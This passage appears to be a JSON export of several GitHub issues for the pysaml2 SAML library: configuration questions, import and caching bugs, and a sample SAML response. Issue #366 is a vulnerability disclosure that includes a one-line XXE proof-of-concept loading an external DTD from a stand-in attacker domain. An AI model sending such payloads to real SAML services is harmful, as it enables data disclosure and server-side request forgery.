"https://api.github.com/repos/IdentityPython/pysaml2/issues/391/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/391/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/391/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/391", "id": 211661860, "node_id": "MDU6SXNzdWUyMTE2NjE4NjA=", "number": 391, "title": "How to configure ForceAuthn=\"true\" using SAML Client", "user": {"login": "ravindrabhavanam", "id": 5889043, "node_id": "MDQ6VXNlcjU4ODkwNDM=", "avatar_url": "https://avatars0.githubusercontent.com/u/5889043?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ravindrabhavanam", "html_url": "https://github.com/ravindrabhavanam", "followers_url": "https://api.github.com/users/ravindrabhavanam/followers", "following_url": "https://api.github.com/users/ravindrabhavanam/following{/other_user}", "gists_url": "https://api.github.com/users/ravindrabhavanam/gists{/gist_id}", "starred_url": "https://api.github.com/users/ravindrabhavanam/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ravindrabhavanam/subscriptions", "organizations_url": "https://api.github.com/users/ravindrabhavanam/orgs", "repos_url": "https://api.github.com/users/ravindrabhavanam/repos", "events_url": "https://api.github.com/users/ravindrabhavanam/events{/privacy}", "received_events_url": "https://api.github.com/users/ravindrabhavanam/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 5605570, "node_id": "MDU6TGFiZWw1NjA1NTcw", "url": "https://api.github.com/repos/IdentityPython/pysaml2/labels/question", "name": "question", "color": "cc317c", "default": true, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2017-03-03T11:18:48Z", "updated_at": "2017-07-26T11:36:47Z", "closed_at": "2017-07-26T11:36:47Z", "author_association": "NONE", "active_lock_reason": null, "body": "I am creating the SAML Request using the below code. I am trying to figure out how to set ForceAuthn attribute in AuthnRequest. \r\n\r\nfrom saml2.client import Saml2Client\r\nfrom saml2.config import Config as Saml2Config\r\n\r\nspConfig = Saml2Config()\r\nspConfig.load(settings)\r\nsaml_client = Saml2Client(config=spConfig)\r\nsaml_client.prepare_for_authenticate()\r\n\r\nI see one attribute 'force_authn' of samlp. But, i couldn't figure out how to set this attribute using above method. Could you point me to any example or documentation for this?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/389", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/389/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/389/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/389/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/389", "id": 210696644, "node_id": "MDU6SXNzdWUyMTA2OTY2NDQ=", "number": 389, "title": "ImportError: No module named Cryptodome", "user": {"login": "schettino72", "id": 138474, "node_id": "MDQ6VXNlcjEzODQ3NA==", "avatar_url": "https://avatars2.githubusercontent.com/u/138474?v=4", "gravatar_id": "", "url": "https://api.github.com/users/schettino72", "html_url": "https://github.com/schettino72", "followers_url": "https://api.github.com/users/schettino72/followers", "following_url": "https://api.github.com/users/schettino72/following{/other_user}", "gists_url": "https://api.github.com/users/schettino72/gists{/gist_id}", "starred_url": "https://api.github.com/users/schettino72/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/schettino72/subscriptions", "organizations_url": "https://api.github.com/users/schettino72/orgs", "repos_url": "https://api.github.com/users/schettino72/repos", "events_url": "https://api.github.com/users/schettino72/events{/privacy}", "received_events_url": "https://api.github.com/users/schettino72/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 7, "created_at": "2017-02-28T06:15:21Z", "updated_at": "2020-08-14T20:47:43Z", "closed_at": "2018-07-06T17:54:25Z", "author_association": "NONE", "active_lock_reason": null, "body": "```\r\n  File \"./idp.py\", line 25, in <module>\r\n    from saml2.authn import is_equal\r\n  File \"/mnt/work/_third/pysaml2/src/saml2/authn.py\", line 5, in <module>\r\n    from saml2.aes import AESCipher\r\n  File \"/mnt/work/_third/pysaml2/src/saml2/aes.py\", line 6, in <module>\r\n    from Cryptodome import Random\r\nImportError: No module named Cryptodome\r\n```\r\n\r\n\"Swap pycrypto* for pyca/cryptography\" was incomplete: https://github.com/rohe/pysaml2/commit/afdf5b4a8cca33dbe746095d9442b958c5fa9a24", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/388", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/388/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/388/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/388/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/388", "id": 209231922, "node_id": "MDU6SXNzdWUyMDkyMzE5MjI=", "number": 388, "title": "AVA Hash empty even though attributes are present in response", "user": {"login": "ecnepsnai", "id": 1607109, "node_id": "MDQ6VXNlcjE2MDcxMDk=", "avatar_url": "https://avatars0.githubusercontent.com/u/1607109?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ecnepsnai", "html_url": "https://github.com/ecnepsnai", "followers_url": "https://api.github.com/users/ecnepsnai/followers", "following_url": "https://api.github.com/users/ecnepsnai/following{/other_user}", "gists_url": "https://api.github.com/users/ecnepsnai/gists{/gist_id}", "starred_url": "https://api.github.com/users/ecnepsnai/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ecnepsnai/subscriptions", "organizations_url": "https://api.github.com/users/ecnepsnai/orgs", "repos_url": "https://api.github.com/users/ecnepsnai/repos", "events_url": "https://api.github.com/users/ecnepsnai/events{/privacy}", "received_events_url": "https://api.github.com/users/ecnepsnai/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2017-02-21T18:28:10Z", "updated_at": "2017-07-25T07:31:33Z", "closed_at": "2017-07-24T15:31:26Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello! I'm implementing SAML login using djangsaml2 into our Askbot application but I'm running into a problem with the attribute hash being empty, even though there are attributes in the response.\r\n\r\nOur IdP is a FortiAuthenticator and you specify which attributes are included in the acs request. I have specified to include the username and email address.\r\n\r\nAfter I authenticate with the IdP, I'm redirected back to a URL managed by djangosaml2, which parses the SAML response and then attempts to authenticate the user. This is failing, because it doesn't have enough information to create a user object.\r\n\r\nHere is the SAML response (omitted some objects)\r\n\r\n```xml\r\n<samlp:Response Destination=\"http://my-sp-url/saml/acs/\"\r\n    ID=\"_130c45a1cd2c4b16b7677dee751abd6d\" InResponseTo=\"id-MNj4X055Hy0ZsNkOu\"\r\n    IssueInstant=\"2017-02-21T18:25:13Z\" Version=\"2.0\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\">\r\n    <saml:Issuer xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">http://my-idp-url/saml-idp/30ylzqaj7wn2s69a/metadata/</saml:Issuer>\r\n    <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\r\n        <ds:SignedInfo>\r\n            <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"></ds:CanonicalizationMethod>\r\n            <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"></ds:SignatureMethod>\r\n            <ds:Reference URI=\"#_130c45a1cd2c4b16b7677dee751abd6d\">\r\n                <ds:Transforms>\r\n                    <ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"></ds:Transform>\r\n                    <ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"></ds:Transform>\r\n                </ds:Transforms>\r\n                <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"></ds:DigestMethod>\r\n                <ds:DigestValue>omitted</ds:DigestValue>\r\n            </ds:Reference>\r\n        </ds:SignedInfo>\r\n        <ds:SignatureValue>omitted</ds:SignatureValue>\r\n        <ds:KeyInfo>\r\n            <ds:X509Data>\r\n                <ds:X509Certificate>omitted</ds:X509Certificate>\r\n            </ds:X509Data>\r\n        </ds:KeyInfo>\r\n    </ds:Signature>\r\n    <samlp:Status>\r\n        <samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"></samlp:StatusCode>\r\n    </samlp:Status>\r\n    <saml:Assertion ID=\"_d7c7e26813f74f688e2ca4a358266764\" IssueInstant=\"2017-02-21T18:25:13Z\"\r\n        Version=\"2.0\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">\r\n        <saml:Issuer>http://my-idp-url/saml-idp/30ylzqaj7wn2s69a/metadata/</saml:Issuer>\r\n        <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\r\n            <ds:SignedInfo>\r\n                <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"></ds:CanonicalizationMethod>\r\n                <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"></ds:SignatureMethod>\r\n                <ds:Reference URI=\"#_d7c7e26813f74f688e2ca4a358266764\">\r\n                    <ds:Transforms>\r\n                        <ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"></ds:Transform>\r\n                        <ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"></ds:Transform>\r\n                    </ds:Transforms>\r\n                    <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"></ds:DigestMethod>\r\n                    <ds:DigestValue>omitted</ds:DigestValue>\r\n                </ds:Reference>\r\n            </ds:SignedInfo>\r\n            <ds:SignatureValue>omitted</ds:SignatureValue>\r\n            <ds:KeyInfo>\r\n                <ds:X509Data>\r\n                    <ds:X509Certificate>omitted</ds:X509Certificate>\r\n                </ds:X509Data>\r\n            </ds:KeyInfo>\r\n        </ds:Signature>\r\n        <saml:Subject>\r\n            <saml:NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:unspecified\"\r\n                SPNameQualifier=\"http://my-sp-url/saml/metadata/\">My Username Here</saml:NameID>\r\n            <saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">\r\n                <saml:SubjectConfirmationData InResponseTo=\"id-MNj4X055Hy0ZsNkOu\"\r\n                    NotOnOrAfter=\"2017-02-21T18:40:13Z\" Recipient=\"http://my-sp-url/saml/acs/\"></saml:SubjectConfirmationData>\r\n            </saml:SubjectConfirmation>\r\n        </saml:Subject>\r\n        <saml:Conditions NotBefore=\"2017-02-21T18:10:13Z\" NotOnOrAfter=\"2017-02-21T18:40:13Z\">\r\n            <saml:AudienceRestriction>\r\n                <saml:Audience>http://my-sp-url/saml/metadata/</saml:Audience>\r\n            </saml:AudienceRestriction>\r\n        </saml:Conditions>\r\n        <saml:AuthnStatement AuthnInstant=\"2017-02-21T18:25:13Z\">\r\n            <saml:AuthnContext>\r\n                <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>\r\n            </saml:AuthnContext>\r\n        </saml:AuthnStatement>\r\n        <saml:AttributeStatement>\r\n            <saml:Attribute Name=\"username\">\r\n                <saml:AttributeValue>My Username Here</saml:AttributeValue>\r\n            </saml:Attribute>\r\n            <saml:Attribute Name=\"mail\">\r\n                <saml:AttributeValue>My Email Here</saml:AttributeValue>\r\n            </saml:Attribute>\r\n        </saml:AttributeStatement>\r\n    </saml:Assertion>\r\n</samlp:Response>\r\n```\r\n\r\nAs you can see near the end of the response, the username and mail attribute are provided.\r\n\r\nHowever, the output from pysaml2 is:\r\n\r\n```\r\n***Unencrypted assertion***\r\nsigned\r\n('assertion context: %s', 'AuthnReq')\r\n('assertion keys: %s', ['authn_statement', 'attribute_statement', 'issue_instant', 'version', 'signature', 'subject', 'conditions', 'id', 'issuer'])\r\n('outstanding_queries: %s', {'id-MNj4X055Hy0ZsNkOu': u'/'})\r\n('conditions: %s', <saml2.saml.Conditions object at 0x7ff4cb456250>)\r\n--- Getting Identity ---\r\n('Subject NameID: %s', <saml2.saml.NameID object at 0x7ff4cb4562d0>)\r\n('Attribute Statement: %s', <saml2.saml.AttributeStatement object at 0x7ff4cb456390>)\r\n('Converts name format: %s', 'urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified')\r\n('Converts name format: %s', 'urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified')\r\n('Converts name format: %s', 'urn:oasis:names:tc:SAML:2.0:attrname-format:basic')\r\n('Converts name format: %s', 'urn:oasis:names:tc:SAML:2.0:attrname-format:uri')\r\n('Converts name format: %s', 'urn:mace:shibboleth:1.0:attributeNamespace:uri')\r\nMissing Attribute Statement\r\n('--- AVA: %s', {})\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/386", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/386/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/386/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/386/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/386", "id": 202901713, "node_id": "MDU6SXNzdWUyMDI5MDE3MTM=", "number": 386, "title": "Missing git tag for 4.0.3", "user": {"login": "yazug", "id": 490772, "node_id": "MDQ6VXNlcjQ5MDc3Mg==", "avatar_url": "https://avatars0.githubusercontent.com/u/490772?v=4", "gravatar_id": "", "url": "https://api.github.com/users/yazug", "html_url": "https://github.com/yazug", "followers_url": "https://api.github.com/users/yazug/followers", "following_url": "https://api.github.com/users/yazug/following{/other_user}", "gists_url": "https://api.github.com/users/yazug/gists{/gist_id}", "starred_url": "https://api.github.com/users/yazug/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/yazug/subscriptions", "organizations_url": "https://api.github.com/users/yazug/orgs", "repos_url": "https://api.github.com/users/yazug/repos", "events_url": "https://api.github.com/users/yazug/events{/privacy}", "received_events_url": "https://api.github.com/users/yazug/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2017-01-24T18:31:29Z", "updated_at": "2017-07-20T10:23:57Z", "closed_at": "2017-07-20T10:23:57Z", "author_association": "NONE", "active_lock_reason": null, "body": "https://pypi.python.org/pypi/pysaml2/4.0.3", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/374", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/374/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/374/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/374/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/374", "id": 185258191, "node_id": "MDU6SXNzdWUxODUyNTgxOTE=", "number": 374, "title": "Why does NCName only match a-zA-Z for the first character?", "user": {"login": "isaaclw", "id": 89917, "node_id": "MDQ6VXNlcjg5OTE3", "avatar_url": "https://avatars3.githubusercontent.com/u/89917?v=4", "gravatar_id": "", "url": "https://api.github.com/users/isaaclw", "html_url": "https://github.com/isaaclw", "followers_url": "https://api.github.com/users/isaaclw/followers", "following_url": "https://api.github.com/users/isaaclw/following{/other_user}", "gists_url": "https://api.github.com/users/isaaclw/gists{/gist_id}", "starred_url": "https://api.github.com/users/isaaclw/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/isaaclw/subscriptions", "organizations_url": "https://api.github.com/users/isaaclw/orgs", "repos_url": "https://api.github.com/users/isaaclw/repos", "events_url": "https://api.github.com/users/isaaclw/events{/privacy}", "received_events_url": "https://api.github.com/users/isaaclw/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2016-10-25T23:15:03Z", "updated_at": "2017-09-02T20:39:22Z", "closed_at": "2017-07-25T15:10:08Z", "author_association": "NONE", "active_lock_reason": null, "body": "I'm not sure if this is my fault as a programmer, or the SAML provider I'm connecting to's fault.\n\nI'm getting back ID's that start with a number:\n1ORZ+LQ7YktMlk7RMJR+N+by1.foo-bar\n\nThe saml looks like this:\n\n```\n<ns0:Response xmlns:ns0=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:ns1=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:ns2=\"http://www.w3.org/2001/04/xmlenc#\" xmlns:ns3=\"http://www.w3.org/2000/09/xmldsig#\" Destination=\"<local development environment>\" ID\n=\"1ORZ+LQ7YktMlk7RMJR+N+by1.foo-bar\" InResponseTo=\"<idp url>\" IssueInstant=\"2016-10-25T22:57:46.961Z\" Version=\"2.0\">\n```\n\nI'm getting a crash when it tries to validate the ncname:\n\nhttps://github.com/rohe/pysaml2/blob/master/src/saml2/validate.py#L44\n\nIs there a reason it's not supposed to start with a digit? perhaps it's expected to start with 'http://' ?\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/373", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/373/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/373/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/373/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/373", "id": 184984690, "node_id": "MDU6SXNzdWUxODQ5ODQ2OTA=", "number": 373, "title": "Identity cache corruption with s2repoze SP plugin", "user": {"login": "MrkGrgsn", "id": 3621881, "node_id": "MDQ6VXNlcjM2MjE4ODE=", "avatar_url": "https://avatars3.githubusercontent.com/u/3621881?v=4", "gravatar_id": "", "url": "https://api.github.com/users/MrkGrgsn", "html_url": "https://github.com/MrkGrgsn", "followers_url": "https://api.github.com/users/MrkGrgsn/followers", "following_url": "https://api.github.com/users/MrkGrgsn/following{/other_user}", "gists_url": "https://api.github.com/users/MrkGrgsn/gists{/gist_id}", "starred_url": "https://api.github.com/users/MrkGrgsn/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/MrkGrgsn/subscriptions", "organizations_url": "https://api.github.com/users/MrkGrgsn/orgs", "repos_url": "https://api.github.com/users/MrkGrgsn/repos", "events_url": "https://api.github.com/users/MrkGrgsn/events{/privacy}", "received_events_url": "https://api.github.com/users/MrkGrgsn/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 6, "created_at": "2016-10-24T23:54:10Z", "updated_at": "2019-05-21T14:51:16Z", "closed_at": "2017-01-10T02:33:44Z", "author_association": "NONE", "active_lock_reason": null, "body": "I'm seeing irregular corruption of the identity cache used by `Saml2Client`. This is accompanied by errors:\n\n> DBRunRecoveryError: (-30974, 'DB_RUNRECOVERY: Fatal error, run database recovery -- PANIC: fatal region error detected; run recovery')\n\nI am using pysaml2 4.0.0 with CKAN running in mod_wsgi with apache 2.4.16 prefork and python 2.7.12.  The `saml2.cache` module uses python shelves, which is defaulting to using Berkely DB.\n\nThe Python documentation for shelve states 'The shelve module does not support concurrent read/write access to shelved objects.' https://docs.python.org/2/library/shelve.html#restrictions, which makes me think it's a concurrency issue. \n\nI'm interested to hear whether anyone else has experienced this issue.\n\nI see that the `Cache` class falls back to caching identities in memory if an identity cache file path is not configured, which being per-process would not result in a shared cache like shelves would. Roland, can you please advise if this would change functionality and whether it would be a safe workaround?\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/368", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/368/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/368/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/368/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/368", "id": 183059637, "node_id": "MDU6SXNzdWUxODMwNTk2Mzc=", "number": 368, "title": "Static file handlers of example servers break w/ recent CherryPy (return unicode instead of bytes)", "user": {"login": "jgehrcke", "id": 265630, "node_id": "MDQ6VXNlcjI2NTYzMA==", "avatar_url": "https://avatars0.githubusercontent.com/u/265630?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jgehrcke", "html_url": "https://github.com/jgehrcke", "followers_url": "https://api.github.com/users/jgehrcke/followers", "following_url": "https://api.github.com/users/jgehrcke/following{/other_user}", "gists_url": "https://api.github.com/users/jgehrcke/gists{/gist_id}", "starred_url": "https://api.github.com/users/jgehrcke/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jgehrcke/subscriptions", "organizations_url": "https://api.github.com/users/jgehrcke/orgs", "repos_url": "https://api.github.com/users/jgehrcke/repos", "events_url": "https://api.github.com/users/jgehrcke/events{/privacy}", "received_events_url": "https://api.github.com/users/jgehrcke/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2016-10-14T14:08:34Z", "updated_at": "2018-07-06T19:02:12Z", "closed_at": "2018-07-06T19:02:12Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "The example servers in this repository are affected by the same issue as described here: https://github.com/rohe/pyoidc/issues/232\n\nExample traceback:\n\n```\nTraceback (most recent call last):\n  File \"/usr/local/lib/python2.7/dist-packages/cherrypy/wsgiserver/__init__.py\", line 1408, in communicate\n    req.respond()\n  File \"/usr/local/lib/python2.7/dist-packages/cherrypy/wsgiserver/__init__.py\", line 862, in respond\n    self.server.gateway(self).respond()\n  File \"/usr/local/lib/python2.7/dist-packages/cherrypy/wsgiserver/__init__.py\", line 2337, in respond\n    raise ValueError('WSGI Applications must yield bytes')\nValueError: WSGI Applications must yield bytes\n```\n\nFrom a user agent's pov this can be the result:\n\n```\nrequests.packages.urllib3.exceptions.ProtocolError: ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))\n```\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/366", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/366/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/366/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/366/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/366", "id": 181454016, "node_id": "MDU6SXNzdWUxODE0NTQwMTY=", "number": 366, "title": "PySAML vulnerable to XXE", "user": {"login": "mrbrutti", "id": 15326, "node_id": "MDQ6VXNlcjE1MzI2", "avatar_url": "https://avatars3.githubusercontent.com/u/15326?v=4", "gravatar_id": "", "url": "https://api.github.com/users/mrbrutti", "html_url": "https://github.com/mrbrutti", "followers_url": "https://api.github.com/users/mrbrutti/followers", "following_url": "https://api.github.com/users/mrbrutti/following{/other_user}", "gists_url": "https://api.github.com/users/mrbrutti/gists{/gist_id}", "starred_url": "https://api.github.com/users/mrbrutti/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/mrbrutti/subscriptions", "organizations_url": "https://api.github.com/users/mrbrutti/orgs", "repos_url": "https://api.github.com/users/mrbrutti/repos", "events_url": "https://api.github.com/users/mrbrutti/events{/privacy}", "received_events_url": "https://api.github.com/users/mrbrutti/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 21, "created_at": "2016-10-06T15:50:31Z", "updated_at": "2017-11-15T11:17:13Z", "closed_at": "2017-11-15T11:17:13Z", "author_association": "NONE", "active_lock_reason": null, "body": "Roland (@rohe), \n#### Description\n\nAn XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.\nIt seams that the PySAML2 library does not contemplate the possibility of SAML \"XML\" requests or responses containing External Entities or File Local inclusion resulting on malicious XML requests or responses being able to trigger an XXE attack. \n#### Proof of Concept SAMLResponse:\n\n``` xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % payload SYSTEM \"http://myevildomain.com/evil.dtd\"> %payload;]>\n```\n\nFor more information refer to:\n- https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing\n- https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet\n#### Recommendations:\n\nIt is my recommendation that you should disable all these by default and if necessary give the user the option to enable them on their settings. \n", "performed_via_github_app": null, "score": 1.0}]}